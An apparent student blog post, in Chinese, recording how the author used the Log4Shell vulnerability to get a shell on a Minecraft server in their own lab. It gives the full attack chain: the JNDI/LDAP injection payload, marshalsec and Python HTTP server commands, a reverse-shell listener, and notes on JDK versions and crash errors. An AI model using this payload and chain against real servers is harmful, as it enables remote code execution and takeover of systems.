# 利用Log4j拿下minecraft服务器

## 写在前面

本文只用作记录网络安全学习过程，如有利用本文的方法攻击公网服务器并产生严重危害，后果自负。





## 前言

由于最近通过一个非常离谱的网络拓扑结构解决了工作室服务器无法通过有线网络连接公网，继而无法下载东西的问题，我们也可以充分利用这台对于学生来说性能十分变态的服务器了。128个CPU，257G的运存的服务器能拿来干嘛呢？跑机器学习模型？做运算服务器？~~挖矿？~~

正好工作室的同学玩`MineCraft`的比较多，正好MC虚无世界3也更新了，就想着在服务器上搭建一个`MineCraft`服务器，通过内网连接，在学习之余一起玩。最近`Log4j`漏洞闹得沸沸扬扬，想到`MineCraft`也用了`log4j`组件，搜了一下b站抖音这类视频平台，暂时只有通过简单的DNS请求检测漏洞，以及小伙伴之间相互小型dos攻击恶搞这方面的视频，没看到直接拿服务器`shell`的视频，想着能不能来操作一下，用打网页的方法来拿个`MC`服务器的`shell`，于是便有了连肝5天，将控制变量法使用得淋漓尽致的故事。





## 环境

1. Linux服务器：`eularOS`，IP：169.254.3.108，Java version：1.8.0_181（因为虚无3的要求，所以MC版本为1.16.5，需要Java8）
2. 本机：`Win10`，IP：169.254.19.82，编译恶意类的Java版本1.8.0_181，运行`ldap`服务器为默认Java版本14





## 漏洞介绍

### CVE-2021-45105

```
Apache Log4j2 versions 2.0-alpha1 through 2.16.0 did not protect from uncontrolled recursion from self-referential lookups. When the logging configuration uses a non-default Pattern Layout with a Context Lookup (for example, $${ctx:loginId}), attackers with control over Thread Context Map (MDC) input data can craft malicious input data that contains a recursive lookup, resulting in a StackOverflowError that will terminate the process. This is also known as a DOS (Denial of Service) attack.
```



### CVE-2021-44228

```
One vector that allowed exposure to this vulnerability was Log4j’s allowance of Lookups to appear in log messages. This meant that when user input is logged, and that user input contained a JNDI Lookup pointing to a malicious server, then Log4j would resolve that JNDI Lookup, connect to that server, and potentially download serialized Java code from that remote server. This in turn could execute any code during deserialization. This is known as a RCE (Remote Code Execution) attack.
```

我们这里只想利用`CVE-2021-44228`这个漏洞来达到RCE的目的





## 前置知识

```
JNDI(Java Naming and Directory Interface,Java命名和目录接口)是SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。目录服务是命名服务的一种自然扩展。两者之间的关键差别是目录服务中对象不但可以有名称还可以有属性（例如，用户有email地址），而命名服务中对象没有属性。

集群JNDI实现了高可靠性JNDI，通过服务器的集群，保证了JNDI的负载平衡和错误恢复。在全局共享的方式下，集群中的一个应用服务器保证本地JNDI树的独立性，并拥有全局的JNDI树。每个应用服务器在把部署的服务对象绑定到自己本地的JNDI树的同时，还绑定到一个共享的全局JNDI树，实现全局JNDI和自身JNDI的联系。

JNDI(Java Naming and Directory Interface)是一个应用程序设计的API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口，类似JDBC都是构建在抽象层上。现在JNDI已经成为J2EE的标准之一，所有的J2EE容器都必须提供一个JNDI的服务。

JNDI可访问的现有的目录及服务有：

DNS、XNam 、Novell目录服务、LDAP(Lightweight Directory Access Protocol轻型目录访问协议)、 CORBA对象服务、文件系统、Windows XP/2000/NT/Me/9x的注册表、RMI、DSML v1&v2、NIS。

Ldap：轻型目录访问协议（英文：Lightweight Directory Access Protocol，缩写：LDAP，/ˈɛldæp/）是一个开放的，中立的，工业标准的应用协议，通过IP协议提供访问控制和维护分布式信息的目录信息。
```





## 漏洞成因

为了输出日志时能够方便地输出任意位置的java对象，Log4j2引入了一个叫Lookup的统一接口。这个接口允许在写日志的时候，按照具体的实现逻辑去查找对象的位置，并输出对象的内容。这里的对象通常在内存中，但由于java支持对象的序列化/反序列化，它也可以存储在硬盘文件里，甚至是远程服务器上。

我们上文提到的JNDI就是对Lookup接口的一种实现。其本身也是一个接口，提供了命名关键字到对象的映射目录，允许开发者提供一个名称，即可获取到对象的内容。LDAP，即轻量级目录访问协议，是JNDI的一种底层实现，它可以让我们方便的查询分布式数据库。既然是分布式的，LDAP允许从远程服务器加载对象。而这里加载对象时使用的不是一般的反序列化方法，而是通过「命名引用」功能，支持直接从远程下载class文件并加载对象。

于是，Log4j2中就暗含了注入漏洞：允许传入参数解析为LDAP协议，从远程服务器下载class文件并执行。这个功能本来是为了方便开发，使java对象位置对上层应用透明，却成了一个核弹。

引自——[Log4j高危漏洞原理及复现](https://blog.csdn.net/qq_51302564/article/details/121963049)





## 漏洞原理分析

[log4j2核弹级漏洞原理和分析](https://blog.csdn.net/WX10301075WX/article/details/121878527)







## 攻击思路

ps：代码和工具github上都有，需要的话可以搜索去下，因为担心出事就不给下载地址了。战队成员可以直接在群里下载。

1. 攻击者在攻击机上将`ExecTemplateJDK7.java`编译为`ExecTemplateJDK7.class`

   ```
   编译： javac filename.java
   
   细节：
   1、恶意代码内容需要根据服务器类型进行更换，例如服务器为Windows操作系统，则恶意代码内容可为"cmd.exe"，为Linux则为"/bin/bash"。
   2、编译时使用的javac所属的JDK版本需与服务器版本相同。(原因：服务器请求回恶意类之后，若该恶意类被不同版本的JDK编译则可能出现服务器不能识别的情况，下文有提及。)
   ```

   ![image-20211225221631093](%E5%88%A9%E7%94%A8Log4j%E6%8B%BF%E4%B8%8Bminecraft%E6%9C%8D%E5%8A%A1%E5%99%A8.assets/image-20211225221631093.png)
   ![image-20211226164122348](%E5%88%A9%E7%94%A8Log4j%E6%8B%BF%E4%B8%8Bminecraft%E6%9C%8D%E5%8A%A1%E5%99%A8.assets/image-20211226164122348.png)

2.  攻击者在攻击机上部署ldap服务，指定监听的端口，以及重定向的url。

   ```
   开启ldap服务所使用的工具为marshalsec-0.0.3-SNAPSHOT-all.jar（github上有，但是好像已经没了）
   具体命令为:
   java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://169.254.19.82:9092/#ExecTemplateJDK7(重定向的url) 1389(本机httpServer的监听端口)
   
   这一步的作用（以这个命令为例）：服务器请求本机1389端口后，ldap服务器将该请求重定向到http://169.254.19.82:9092/#ExecTemplateJDK7。
   ```

3. 攻击者将恶意类开放为http服务可请求资源（即重定向指向的资源）

   ```
   在编译好的恶意类所在的文件夹位置开启http服务，比较简易的（也是我们采用的）是用Python
   具体命令为：python -m http.server 9092（不指定端口的话，默认是8000），即可将位于命令开启位置的文件作为http资源向网络开放。
   ```

4. 攻击者登录客户端连接服务器，

   ```
   输入命令${jndi:ldap://169.254.19.82:1389/#ExecTemplateJDK7}
   即通过jndi这个接口，发起ldap请求。
   ```



**整体攻击逻辑：**

​		攻击者在mc客户端的聊天框中输入: `${jndi:ldap://169.254.19.82:1389/#ExecTemplateJDK7}` 后，被攻击机通过`jndi`发起`ldap`请求，即被攻击机`(169.254.3.108)`向攻击机`(169.254.19.82)`的设备的`1389`端口请求名字为`ExecTemplateJDK7`的资源），被攻击机的请求到达`ldap`服务器`(IP地址为169.254.19.82)`指定端口`(即1389端口)`后，`ldap`服务器将该请求重定向到放有恶意类`(ExecTemplateJDK7.class)`的端口`(即9092端口)`，服务器请求到恶意类并实例化，达到命令执行。





## 攻击过程

启动`ldap`服务器

![image-20211226001257878](%E5%88%A9%E7%94%A8Log4j%E6%8B%BF%E4%B8%8Bminecraft%E6%9C%8D%E5%8A%A1%E5%99%A8.assets/image-20211226001257878.png)

启动`http`服务器

![image-20211226001409246](%E5%88%A9%E7%94%A8Log4j%E6%8B%BF%E4%B8%8Bminecraft%E6%9C%8D%E5%8A%A1%E5%99%A8.assets/image-20211226001409246.png)

启动nc监听

![image-20211226001627829](%E5%88%A9%E7%94%A8Log4j%E6%8B%BF%E4%B8%8Bminecraft%E6%9C%8D%E5%8A%A1%E5%99%A8.assets/image-20211226001627829.png)

登录mc客户端，连接服务器

![image-20211226001815448](%E5%88%A9%E7%94%A8Log4j%E6%8B%BF%E4%B8%8Bminecraft%E6%9C%8D%E5%8A%A1%E5%99%A8.assets/image-20211226001815448.png)

![image-20211226001852168](%E5%88%A9%E7%94%A8Log4j%E6%8B%BF%E4%B8%8Bminecraft%E6%9C%8D%E5%8A%A1%E5%99%A8.assets/image-20211226001852168.png)

后面的效果实操的时候再演示，或者可以看我发的视频





## 坑

这其实就是漏洞的攻击过程，也就意味着我们在每个地方都摔过跤。。。orz

1. 客户端发送请求不加类名或错误类名，服务器只能与攻击机`ldap`服务器建立连接，但无法进行寻找等操作。（其实这也是一种攻击方式，就是b站很多利用`log4j`漏洞恶搞小伙伴的方法，它有点类似DOS攻击，因为它找不到文件所以会一直请求，导致原本应该处理的操作被延后，反应出来的情况就是小伙伴卡顿，甚至服务器mc程序崩溃。本地测试和内网测试的时候也时不时把弄崩溃）

   ```
   ${jndi:ldap://ip:port/#类名}
   ```

2. `minecraft`客户端输入语句正确，服务器成功执行`ldap`请求，`ldap`服务器接收到请求，显示重定向到`http server`上对应的恶意类文件，但`http server`未收到请求。确保`http server`上文件可以访问的情况下，查看运行`minecraft`服务器的`Java`版本是否是可以利用的版本

   ```
   python开启http server：
   python -m http.server {port}
   (在哪个文件夹运行命令就将该文件夹作为httpServer的根目录)
   
   查看http server里的文件是否可以请求：
   curl http://ip:port/filename
   
   查看Java版本:
   java -version
   这是我的
   java version "1.8.0_181"
   Java(TM) SE Runtime Environment (build 1.8.0_181-b13)
   Java HotSpot(TM) 64-Bit Server VM (build 25.181-b13, mixed mode)
   
   jdk版本：6u211 / 7u201 / 8u191 / 11.0.1以下(不包括)
   ```

3. `ldap`服务器成功重定向给`http`服务器，`mc`服务器成功拿到恶意类，但没有执行，反而`mc`服务器程序直接崩溃报错，这里我遇到两种情况：

   1. 编译恶意类的Java版本与运行mc服务器的Java版本不对应
   
      ```
      Time: 21-12-25 上午11:04
      Description: Exception in server tick loop
      
      java.lang.UnsupportedClassVersionError: h3W has been compiled by a more recent version of the Java Runtime (class file version 58.0), this version of the Java Runtime only recognizes class file versions up to 52.0
      
      翻译过来意思就是h3W这个类编译时用的是58.0这个版本编译的，而运行时却是52.0，所以报错。因为我是在本地编译这个恶意类的，而我本地默认Java版本为14，mc服务器上的Java默认版本为8，所以会报错。
      
      这里有两个解决方法：
      1、在本地使用Java8重新编译生成该恶意类		√
      2、将mc服务器的Java环境改为14，但这显然不现实，因为本来你就是个攻击者，别人怎么可能改环境配合你，更何况mc1.16.5需要Java8的环境才能启动		×
      ```
   
   2. 编译恶意类后为了图方便随意重命名（我当时犯傻了，没想到Java实例化类是靠文件名来实例化的）
   
      ```
      Time: 21-12-25 上午11:08
      Description: Exception in server tick loop
      
      java.lang.NoClassDefFoundError: h3W (wrong name: Log4jRCE)
      ```
   
4. 拿到服务器`shell`后，过一会mc服务器程序直接崩溃闪退

   ```
   Time: 21-12-25 上午11:18
   Description: Watching Server
   
   java.lang.Error: Watchdog
   	at java.lang.Thread.sleep(Native Method)
   	at ExecTemplateJDK7.<clinit>(ExecTemplateJDK7.java:26)
   	at java.lang.Class.forName0(Native Method)
   	
   ExecTemplateJDK7的26行是：
   Thread.sleep(50);
   
   网上说是一种监控机制，检测到服务器异常会强行终止服务。
   我不是很会Java，有了解的同学麻烦教我一下。
   ```

   